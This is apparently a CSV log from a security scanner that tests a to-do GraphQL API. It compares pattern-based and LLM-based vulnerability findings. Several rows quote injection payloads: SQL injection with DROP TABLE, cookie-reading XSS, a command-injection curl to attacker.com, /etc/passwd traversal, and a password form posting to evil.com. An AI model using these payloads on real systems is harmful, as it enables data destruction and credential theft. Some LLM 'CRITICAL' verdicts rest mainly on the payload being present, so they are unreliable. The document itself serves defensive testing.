timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-05T15:34:00.244384,createTodo_response_2,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]","[{""detection_name"": ""LLM: sql_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The title payload contains SQL-specific syntax ('OR '1'='1' and DROP TABLE) designed to manipulate database queries. The 200 status code suggests the server accepted the input without errors, indicating potential unsanitized input in SQL queries. While confirmation requires observing database behavior, the payload structure strongly suggests SQL injection risk."", ""evidence"": ""Title field contains payload: 'Complete task' OR '1'='1'; DROP TABLE todos;--"", ""confidence"": 0.85, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""sql_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.85, ""evidence"": ""Title field contains payload: 'Complete task' OR '1'='1'; DROP TABLE todos;--"", ""explanation"": ""The title payload contains SQL-specific syntax ('OR '1'='1' and DROP TABLE) designed to manipulate database queries. The 200 status code suggests the server accepted the input without errors, indicating potential unsanitized input in SQL queries. While confirmation requires observing database behavior, the payload structure strongly suggests SQL injection risk.""}}]"
2025-10-05T15:34:16.238426,createTodo_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response returns unsanitized user-controlled HTML payload (<img> tag with JavaScript in onerror attribute). If this title is rendered in a browser without proper escaping/sanitization, it will execute arbitrary JavaScript (stealing cookies via alert(document.cookie)), demonstrating a classic stored XSS vulnerability. The 200 status code confirms server acceptance of the payload."", ""evidence"": ""title field contains: '<img src=x onerror=alert(document.cookie)>'"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""title field contains: '<img src=x onerror=alert(document.cookie)>'"", ""explanation"": ""The response returns unsanitized user-controlled HTML payload (<img> tag with JavaScript in onerror attribute). If this title is rendered in a browser without proper escaping/sanitization, it will execute arbitrary JavaScript (stealing cookies via alert(document.cookie)), demonstrating a classic stored XSS vulnerability. The 200 status code confirms server acceptance of the payload.""}}]"
2025-10-05T15:34:23.817167,createTodo_response_4,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T15:34:52.690875,createTodo_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The 'title' parameter contains a semicolon (;) followed by a curl command to an external domain. In Unix-like systems, semicolons are command separators, which could allow an attacker to chain arbitrary commands if the input is passed unsanitized to a system shell. This pattern is a strong indicator of attempted OS command injection, as curl to a foreign domain suggests exfiltration or callback testing."", ""evidence"": ""title: 'test; curl https://attacker.com/exfiltrate'"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.9, ""evidence"": ""title: 'test; curl https://attacker.com/exfiltrate'"", ""explanation"": ""The 'title' parameter contains a semicolon (;) followed by a curl command to an external domain. In Unix-like systems, semicolons are command separators, which could allow an attacker to chain arbitrary commands if the input is passed unsanitized to a system shell. This pattern is a strong indicator of attempted OS command injection, as curl to a foreign domain suggests exfiltration or callback testing.""}}]"
2025-10-05T15:35:16.246743,createTodo_response_6,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]","[{""detection_name"": ""LLM: Path Injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response shows successful processing of a title containing a directory traversal sequence ('../../../etc/passwd'). This indicates the backend might: 1) Use unsanitized user input in file system paths, 2) Accept path manipulation in file operations, and 3) Possibly allow unauthorized access to sensitive system files. In a createTodo context, this could indicate improper path handling for file storage operations. While no direct file contents are exposed, the pattern matches path injection techniques targeting Unix/Linux systems."", ""evidence"": ""Title field contains '../../../etc/passwd' which is a classic directory traversal pattern"", ""confidence"": 0.85, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""Path Injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.85, ""evidence"": ""Title field contains '../../../etc/passwd' which is a classic directory traversal pattern"", ""explanation"": ""The response shows successful processing of a title containing a directory traversal sequence ('../../../etc/passwd'). This indicates the backend might: 1) Use unsanitized user input in file system paths, 2) Accept path manipulation in file operations, and 3) Possibly allow unauthorized access to sensitive system files. In a createTodo context, this could indicate improper path handling for file storage operations. While no direct file contents are exposed, the pattern matches path injection techniques targeting Unix/Linux systems.""}}]"
2025-10-05T15:35:23.716172,createTodo_response_7,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: html_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains unsanitized HTML markup (`<form>` and `<input>` tags) in the `title` field. When rendered in a browser, this would create a password input form submitting to an external domain (evil.com), enabling phishing or credential harvesting. While this isn't script execution (XSS), it demonstrates HTML injection allowing UI manipulation and trust abuse."", ""evidence"": ""<form action='http://evil.com'>Enter password:<input type='password'></form>"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""HIGH"", ""confidence"": 0.95, ""evidence"": ""<form action='http://evil.com'>Enter password:<input type='password'></form>"", ""explanation"": ""The response contains unsanitized HTML markup (`<form>` and `<input>` tags) in the `title` field. When rendered in a browser, this would create a password input form submitting to an external domain (evil.com), enabling phishing or credential harvesting. While this isn't script execution (XSS), it demonstrates HTML injection allowing UI manipulation and trust abuse.""}}]"
2025-10-05T15:36:32.943282,createTodo_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T15:36:48.576096,createTodo_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T15:37:23.648692,createTodo_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T15:37:48.224561,createTodo_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Unknown,1,0,0,0,1,0,0.0,llm_potential_only,,,Unknown,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: field_suggestions"", ""detection"": ""potential"", ""category"": ""Unknown"", ""description"": ""The server discloses schema structure by suggesting corrections for mistyped field names (titl\u2192title, compleeted\u2192completed, tittle\u2192title). While not directly exposing data, this information disclosure helps attackers map the API's schema and craft more targeted attacks. Field suggestions are explicitly enabled in GraphQL implementations and should be disabled in production environments to prevent schema enumeration."", ""evidence"": ""Multiple 'Did you mean' suggestions: \""Field \\\""titl\\\""... Did you mean \\\""title\\\""?\"", \\\""compleeted\\\""... \\\""completed\\\""?, \\\""tittle\\\""... \\\""title\\\""?\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""field_suggestions"", ""severity"": ""MEDIUM"", ""confidence"": 0.95, ""evidence"": ""Multiple 'Did you mean' suggestions: \""Field \\\""titl\\\""... Did you mean \\\""title\\\""?\"", \\\""compleeted\\\""... \\\""completed\\\""?, \\\""tittle\\\""... \\\""title\\\""?\"""", ""explanation"": ""The server discloses schema structure by suggesting corrections for mistyped field names (titl\u2192title, compleeted\u2192completed, tittle\u2192title). While not directly exposing data, this information disclosure helps attackers map the API's schema and craft more targeted attacks. Field suggestions are explicitly enabled in GraphQL implementations and should be disabled in production environments to prevent schema enumeration.""}}]"
